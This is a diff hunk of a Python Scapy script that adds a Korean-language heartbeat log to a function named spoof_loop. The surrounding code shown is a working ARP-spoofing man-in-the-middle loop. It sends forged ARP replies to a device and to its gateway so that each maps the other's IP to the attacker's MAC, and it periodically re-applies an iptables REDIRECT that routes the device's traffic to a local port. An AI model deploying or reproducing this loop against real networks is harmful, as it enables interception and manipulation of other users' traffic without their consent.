@@ -116,12 +116,16 @@ def spoof_loop():
     to_dev = Ether(dst=DEVICE_MAC) / ARP(op=2, psrc=GATEWAY_IP, hwsrc=MY_MAC, pdst=DEVICE_IP, hwdst=DEVICE_MAC)
     to_gw = Ether(dst=GATEWAY_MAC) / ARP(op=2, psrc=DEVICE_IP, hwsrc=MY_MAC, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC)
     n = 0
+    # 하트비트 주기(초) — 살아있음 확인용
+    hb_every = max(1, int(60 / INTERVAL)) if INTERVAL > 0 else 30
     while not stop.is_set():
         sendp(to_dev, iface=IFACE, verbose=0)
         sendp(to_gw, iface=IFACE, verbose=0)
         n += 1
         if n % 30 == 0:
             add_iptables()  # 혹시 규칙이 사라졌으면 재적용
+        if n % hb_every == 0:
+            log("정상 동작 중 — ARP %d회 전송, iptables REDIRECT 유지 (기기 %s → 로컬 :%d)" % (n, DEVICE_IP, LOCAL_PORT))
         stop.wait(INTERVAL)
 
 
